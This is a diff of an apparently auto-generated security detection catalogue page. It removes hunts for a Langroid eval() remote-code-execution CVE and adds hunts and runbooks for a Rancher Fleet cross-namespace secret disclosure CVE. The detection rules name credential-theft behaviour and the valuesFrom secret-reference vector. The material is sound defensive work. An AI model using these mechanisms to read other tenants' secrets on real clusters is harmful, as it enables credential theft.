-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Surfaces hosts running a Langroid version affected by CVE-2026-54769 (pip:langroid &lt;= 0.65.1; fixed in 0.65.2) via Defender TVM. Direct exposure-management pivot so the SOC can prioritize hardening/upgrade of any host that could serve the TableChatAgent/VectorStore eval() RCE.
-
-Rationale: Grounded on the article&#x27;s affected range &#x27;pip:langroid (vuln &lt;= 0.65.1)&#x27; and web-confirmed fix version 0.65.2 (GitLab advisory). Matches by CVE id and a version regex covering all 0.65.0/0.65.1 and earlier 0.6x releases.
-
-Cross-checked against:
-  • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
-  • https://github.com/langroid/langroid/releases</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploitation for Client Execution">T1203</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Air-gapped/dev hosts where langroid is present but never exposed to untrusted prompts</li><li>TVM lag reporting a version that has since been upgraded to 0.65.2</li><li>langroid pinned in a virtualenv the app never actually runs</li><li>Version parsed from a lockfile/artifact rather than an installed/importable package</li><li>Non-affected forks that share the &#x27;langroid&#x27; package name</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: for each host, confirm langroid is actually loaded by a running agent and whether that agent exposes TableChatAgent/VectorStore with full_eval=True to untrusted input. 2) Contain: prioritize internet-/user-facing agents — upgrade langroid to &gt;= 0.65.2 and disable full_eval where not required. 3) Hunt: on any exposed host, retro-hunt UC1/UC2/UC3 over the exposure window to rule out prior exploitation before closing.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-138-uc3-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-138-uc3-sentinel">Sentinel KQL</button>
-    </div>
-    <div class="tab-content active" id="art-138-uc3-kql"><pre><button class="copy-btn">COPY</button><code>DeviceTvmSoftwareVulnerabilities
-| where CveId == &quot;CVE-2026-54769&quot; or (SoftwareName has &quot;langroid&quot; and SoftwareVersion matches regex @&quot;^0\.(6[0-4]\.|65\.[01])&quot;)
-| project DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| sort by DeviceName asc</code></pre></div>
-    <div class="tab-content" id="art-138-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>DeviceTvmSoftwareVulnerabilities
-| where TimeGenerated &gt; ago(1d)
-| where CveId == &quot;CVE-2026-54769&quot; or (SoftwareName has &quot;langroid&quot; and SoftwareVersion matches regex @&quot;^0\.(6[0-4]\.|65\.[01])&quot;)
-| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| sort by DeviceName asc</code></pre></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
-  <summary>
-    <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
-    <span class="uc-phase">Reconnaissance</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="222a505c20" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Match vulnerability scanner output to the CVE(s) named in the article.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-138-uc4-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-138-uc4-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-138-uc4-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-138-uc4-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
-// partitions on Timestamp instead of scanning the full retention.
-DeviceTvmSoftwareVulnerabilities
-| where Timestamp &gt; ago(1d)
-| where CveId in~ (&quot;CVE-2026-54769&quot;)
-| join kind=inner (DeviceInfo | where Timestamp &gt; ago(1d)) on DeviceId
-| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| order by VulnerabilitySeverityLevel asc, DeviceName asc
-</code></pre></div>
-    <div class="tab-content" id="art-138-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
-// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
-// no Sentinel translation — track via Update / Heartbeat OS-version
-// gaps as a coarse approximation.
-DeviceTvmSoftwareVulnerabilities
-| where TimeGenerated &gt; ago(1d)
-| where CveId in~ (&quot;CVE-2026-54769&quot;)
-| join kind=inner (DeviceInfo | where TimeGenerated &gt; ago(1d)) on DeviceId
-| project DeviceName, OSPlatform, CveId,
-          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
-| order by VulnerabilitySeverityLevel asc, DeviceName asc
-</code></pre></div>
-    <div class="tab-content" id="art-138-uc4-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-138-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-138-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-138-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Vulnerabilities
-    where Vulnerabilities.signature IN (&quot;CVE-2026-54769&quot;)
-    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
-| `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre><pre class="spl-mode-body" id="art-138-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Vulnerabilities
-    where Vulnerabilities.signature IN (&quot;CVE-2026-54769&quot;)
-    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
-| `drop_dm_object_name(Vulnerabilities)`
-| sort - severity</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="e6d0d0237d" data-platforms="def,sent,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execut</span>
-    <span class="uc-phase">Installation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="e6d0d0237d" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="User Execution: Malicious File">T1204.002</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-138-uc5-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-138-uc5-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-138-uc5-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-138-uc5-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execut
-// Hunts the actual binaries / paths / commandline fragments named
-// in the article instead of a generic technique-class template.
-
-// File-creation events for the named binaries / paths
-DeviceFileEvents
-| where Timestamp &gt; ago(30d)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
-| where (FolderPath has_any (&quot;/tmp/rce_success_table&quot;))
-| project Timestamp, DeviceName, AccountName, FolderPath,
-          FileName, ActionType, InitiatingProcessFileName,
-          InitiatingProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
-// Requires the Microsoft 365 Defender data connector (streams the
-// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
-// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execut
-// Hunts the actual binaries / paths / commandline fragments named
-// in the article instead of a generic technique-class template.
-
-// File-creation events for the named binaries / paths
-DeviceFileEvents
-| where TimeGenerated &gt; ago(30d)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
-| where (FolderPath has_any (&quot;/tmp/rce_success_table&quot;))
-| project TimeGenerated, DeviceName, AccountName, FolderPath,
-          FileName, ActionType, InitiatingProcessFileName,
-          InitiatingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc5-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-138-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-138-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-138-uc5-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execut ```
-| tstats `summariesonly` count
-    from datamodel=Endpoint.Filesystem
-    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
-      AND (Filesystem.file_path=&quot;*/tmp/rce_success_table*&quot;)
-    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
-       Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-138-uc5-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execut ```
-| tstats summariesonly=false count
-    from datamodel=Endpoint.Filesystem
-    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
-      AND (Filesystem.file_path=&quot;*/tmp/rce_success_table*&quot;)
-    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
-       Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`</code></pre></div></div>
-  </div>
-</details></div>
-</article>
 <article class="card" id="art-139" data-art-slug="2026-07-06-ghsa-critical-cve-2026-53486-decompress-archive-extraction-c"
   data-phases="actions,c2,exploit,install,recon,weapon" data-sev="crit"
   data-techs="T1190"
@@ -13132,6 +12705,243 @@ DeviceTvmSoftwareVulnerabilities
 | sort - severity</code></pre><pre class="spl-mode-body" id="art-166-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
     from datamodel=Vulnerabilities
     where Vulnerabilities.signature IN (&quot;CVE-2026-41052&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre></div></div>
+  </div>
+</details></div>
+</article>
+<article class="card" id="art-167" data-art-slug="2026-07-01-ghsa-critical-cve-2026-44935-rancher-fleet-vulnerable-to-cro"
+  data-phases="actions,c2,exploit,install,recon" data-sev="crit"
+  data-techs="T1190,T1552"
+  data-sources="GitHub Security Advisories"
+  data-platforms="datadog,def,sent,sigma,spl"
+  data-splunk-cats="application,cloud"
+  data-targets="kubernetes,vcs"
+  data-uc-count="3" data-llm-uc-count="2"
+  data-search="[GHSA / CRITICAL] CVE-2026-44935: Rancher Fleet vulnerable to cross namespace secret disclosure via unvalidated `valuesFrom` references in Helm Deployer Rancher Fleet vulnerable to cross namespace secret disclosure via unvalidated `valuesFrom` references in Helm Deployer CVE-2026-44935 T1190 T1552 [LLM] Fleet valuesFrom cross-namespace secret/configmap reference (CVE-2026-44935) [LLM] Fleet agent service account reads secrets across multiple namespaces (CVE-2026-44935) Asset exposure — vulnerability matches article CVE(s)">
+  <div class="sev-ribbon crit">Critical</div>
+  <button class="share-btn card-share" data-share-art="2026-07-01-ghsa-critical-cve-2026-44935-rancher-fleet-vulnerable-to-cro" title="Copy share link to this article" aria-label="Copy share link">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+  </button>
+  <h2><a href="https://github.com/advisories/GHSA-xr65-5cpm-g36x" target="_blank" rel="noopener">[GHSA / CRITICAL] CVE-2026-44935: Rancher Fleet vulnerable to cross namespace secret disclosure via unvalidated `valuesFrom` references in Helm Deployer</a></h2>
+  <div class="source-badges"><span class="source-badge ">GitHub Security Advisories</span></div>
+  <div class="pubmeta">
+    <span>2026-07-01</span>
+    <span>3 use cases</span>
+    <span>2 techniques</span>
+    <span>3 kill-chain phases detected</span>
+  </div>
+  <p class="summary">Rancher Fleet vulnerable to cross namespace secret disclosure via unvalidated `valuesFrom` references in Helm Deployer</p>
+  <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-44935</span></div>
+<div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="T1552">T1552</span></div>
+  <div class="action-row">
+    <button class="btn btn-kc" data-target="art-167-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
+    <button class="btn btn-hunt" data-hunt-art="art-167"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
+    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
+  </div>
+  <div class="killchain" id="art-167-kc">
+  <div class="kc3d"><div class="kc-cell hit">
+  <div class="num">Phase 1</div>
+  <div class="name">Reconnaissance</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 2</div>
+  <div class="name">Weaponization</div>
+  <div class="marker">—</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 3</div>
+  <div class="name">Delivery</div>
+  <div class="marker">—</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 4</div>
+  <div class="name">Exploitation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell inferred">
+  <div class="num">Phase 5</div>
+  <div class="name">Installation</div>
+  <div class="marker">Likely</div>
+</div>
+<div class="kc-cell inferred">
+  <div class="num">Phase 6</div>
+  <div class="name">Command &amp; Control</div>
+  <div class="marker">Likely</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 7</div>
+  <div class="name">Actions on Objectives</div>
+  <div class="marker">Detected</div>
+</div></div>
+  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
+<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
+<div class="phase-line "><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code.</div>
+<div class="phase-line inferred"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key.</div>
+<div class="phase-line inferred"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
+<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage. <em>→ [LLM] Fleet valuesFrom cross-namespace secret/configmap reference (CVE-2026-44935) · [LLM] Fleet agent service account reads secrets across multiple namespaces (CVE-2026-44935)</em></div></div>
+</div>
+  <div class="usecases"><details class="uc" data-uc-slug="5d5cbfdd9a" data-platforms="datadog,sent,sigma,spl" data-targets="kubernetes,vcs" open>
+  <summary>
+    <span class="uc-title">Fleet valuesFrom cross-namespace secret/configmap reference (CVE-2026-44935)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="5d5cbfdd9a" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunts Rancher Fleet GitRepo/HelmOp/Bundle custom resources whose spec contains a `valuesFrom` block with a secretKeyRef/configMapKeyRef, the exact mechanism CVE-2026-44935 abuses to read secrets in namespaces the tenant is not authorized for. Article-specific because it pivots on the Fleet CRD resource names plus the `valuesFrom` key-reference structure rather than generic secret access.
+
+Rationale: Uses the exact Fleet CRD resource names (gitrepos/helmops/bundles from go:github.com/rancher/fleet) and the `valuesFrom` + secretKeyRef/configMapKeyRef structure named in GHSA-xr65-5cpm-g36x as the exploitation vector; high-fidelity because legitimate fleet.yaml normally references secrets in the same namespace only.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xr65-5cpm-g36x
+  • https://attack.mitre.org/techniques/T1552/007/</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Unsecured Credentials: Container API">T1552.007</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate multi-namespace GitOps deployment where an operator intentionally references a shared config namespace</li><li>Fleet platform team testing valuesFrom against a sanctioned central secrets namespace</li><li>CI pipelines that template Bundles with valuesFrom to a common values ConfigMap</li><li>Upgrade migrations that recreate existing GitRepo resources with unchanged valuesFrom blocks</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (Username has &quot;system:serviceaccount:cattle-fleet-system&quot; and ObjNamespace == extract(@&quot;namespace:\s*([a-z0-9-]+)&quot;, 1, ReqStr))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: pull the full RequestObject; compare the namespace inside valuesFrom to ObjectRef.namespace and to the tenant that owns the requesting Username — a mismatch to a namespace the tenant has no RBAC in is the true positive. 2) Contain: delete/suspend the offending GitRepo/HelmOp/Bundle, and rotate any secret whose name/namespace/key appears in the valuesFrom reference (advisory explicitly recommends rotation). 3) Hunt: enumerate all Fleet CRs created by the same Username across the cluster and check whether the Fleet agent service account subsequently read those referenced secrets (see companion fan-out UC).</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-167-uc0-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-167-uc0-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-167-uc0-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-167-uc0-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-167-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>AKSAudit
+| where TimeGenerated &gt; ago(7d)
+| where Verb in (&quot;create&quot;,&quot;update&quot;,&quot;patch&quot;)
+| extend ObjResource = tostring(ObjectRef.resource), ObjNamespace = tostring(ObjectRef.namespace)
+| where ObjResource in (&quot;gitrepos&quot;,&quot;helmops&quot;,&quot;bundles&quot;)
+| extend ReqStr = tostring(RequestObject)
+| where ReqStr has &quot;valuesFrom&quot; and (ReqStr has &quot;secretKeyRef&quot; or ReqStr has &quot;configMapKeyRef&quot;)
+| where ReqStr has &quot;namespace&quot;    // cross-namespace ref requires an explicit namespace inside valuesFrom
+| project TimeGenerated, Username, Verb, ObjResource, ObjNamespace, RequestUri, ReqStr
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-167-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Rancher Fleet valuesFrom Cross-Namespace Secret Reference (CVE-2026-44935)
+id: b3f1c8a2-7d4e-4a1b-9c2f-6e8a5d3b1f04
+description: Detects Fleet GitRepo/HelmOp/Bundle resources whose spec embeds a valuesFrom secretKeyRef/configMapKeyRef, the vector for CVE-2026-44935 cross-namespace secret disclosure.
+references:
+  - https://github.com/advisories/GHSA-xr65-5cpm-g36x
+author: SOC Detection Engineering
+date: 2026/07/07
+tags:
+  - attack.credential_access
+  - attack.t1552.007
+logsource:
+  product: kubernetes
+  service: audit
+detection:
+  selection_verb:
+    verb:
+      - create
+      - update
+      - patch
+  selection_resource:
+    objectRef.resource:
+      - gitrepos
+      - helmops
+      - bundles
+  selection_valuesfrom:
+    requestObject|contains: &#x27;valuesFrom&#x27;
+  selection_keyref:
+    requestObject|contains:
+      - &#x27;secretKeyRef&#x27;
+      - &#x27;configMapKeyRef&#x27;
+  condition: selection_verb and selection_resource and selection_valuesfrom and selection_keyref
+level: high</code></pre></div>
+    <div class="tab-content" id="art-167-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:kubernetes.audit @verb:(create OR update OR patch) @objectRef.resource:(gitrepos OR helmops OR bundles) valuesFrom (secretKeyRef OR configMapKeyRef)</code></pre></div>
+    <div class="tab-content" id="art-167-uc0-spl"><span class="splunk-cat-pill splunk-cat-cloud" title="Splunk-research detection category">CLOUD</span><pre><button class="copy-btn">COPY</button><code>index=kube_audit (verb=create OR verb=update OR verb=patch) (&quot;objectRef.resource&quot;=gitrepos OR &quot;objectRef.resource&quot;=helmops OR &quot;objectRef.resource&quot;=bundles) requestObject=*valuesFrom* (requestObject=*secretKeyRef* OR requestObject=*configMapKeyRef*) | table _time, user.username, verb, objectRef.resource, objectRef.namespace, requestURI | sort - _time</code></pre></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="33259390da" data-platforms="datadog,sent,spl" data-targets="kubernetes">
+  <summary>
+    <span class="uc-title">Fleet agent service account reads secrets across multiple namespaces (CVE-2026-44935)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="33259390da" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Detects the downstream-cluster fingerprint of CVE-2026-44935: the Fleet agent service account issuing get/list of secrets or configmaps across an abnormal number of distinct namespaces within a short window, indicating cross-tenant credential harvesting via unrestricted valuesFrom/HelmOp deployment. Article-specific because it keys on the Fleet agent SA identity and the cross-namespace fan-out the advisory tells defenders to review logs for.
+
+Rationale: Pivots on the Fleet agent service account identity (cattle-fleet-system fleet-agent) reading secrets/configmaps across namespaces — the exact post-exploit behaviour GHSA-xr65-5cpm-g36x tells operators to review cluster logs for and to drive credential rotation.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xr65-5cpm-g36x
+  • https://attack.mitre.org/techniques/T1552/007/</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Unsecured Credentials: Container API">T1552.007</span> <span class="ind tech" title="Container and Resource Discovery">T1613</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate multi-tenant cluster where the Fleet agent SA is authorized to deploy into many namespaces by design</li><li>Initial Fleet onboarding/bootstrap that syncs bundles into a large set of namespaces at once</li><li>Backup/DR tooling running under a fleet-labelled SA enumerating secrets</li><li>Cluster-wide chart rollout (e.g. cert-manager, monitoring) driven through Fleet touching every namespace</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: list the distinct namespaces and secret names the Fleet agent SA touched; confirm against the tenant boundary — reads into namespaces owned by a different tenant are the true positive. 2) Contain: rotate the Fleet agent service account token and every secret it read cross-tenant, then apply the patched-version Policy resource pinning a least-privilege service account per GitRepo/HelmOp/Bundle namespace. 3) Hunt: correlate back to companion UC (valuesFrom cross-namespace references) to identify which GitRepo/HelmOp/Bundle CR triggered the reads and which tenant Username authored it; upgrade Fleet to v0.15.2/v0.14.6/0.13.11/v0.12.15.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-167-uc1-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-167-uc1-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-167-uc1-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-167-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>AKSAudit
+| where TimeGenerated &gt; ago(1d)
+| where Verb in (&quot;get&quot;,&quot;list&quot;,&quot;watch&quot;)
+| extend Resource = tostring(ObjectRef.resource), NS = tostring(ObjectRef.namespace)
+| where Resource in (&quot;secrets&quot;,&quot;configmaps&quot;)
+| where Username has &quot;serviceaccount&quot; and Username has &quot;fleet&quot;
+| summarize NamespaceCount = dcount(NS), Namespaces = make_set(NS, 50), Requests = count() by Username, bin(TimeGenerated, 1h)
+| where NamespaceCount &gt; 3    // 3 = a single Fleet agent normally serves a bounded tenant namespace set; fan-out beyond that is the CVE signal
+| order by NamespaceCount desc</code></pre></div>
+    <div class="tab-content" id="art-167-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:kubernetes.audit @verb:(get OR list OR watch) @objectRef.resource:(secrets OR configmaps) @user.username:*fleet*</code></pre></div>
+    <div class="tab-content" id="art-167-uc1-spl"><span class="splunk-cat-pill splunk-cat-cloud" title="Splunk-research detection category">CLOUD</span><pre><button class="copy-btn">COPY</button><code>index=kube_audit (verb=get OR verb=list OR verb=watch) (&quot;objectRef.resource&quot;=secrets OR &quot;objectRef.resource&quot;=configmaps) &quot;user.username&quot;=*fleet* | stats dc(objectRef.namespace) AS NamespaceCount values(objectRef.namespace) AS Namespaces count AS Requests by user.username | where NamespaceCount &gt; 3 | sort - NamespaceCount</code></pre></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
+  <summary>
+    <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
+    <span class="uc-phase">Reconnaissance</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="222a505c20" title="Copy share link to this UC" aria-label="Copy share link">
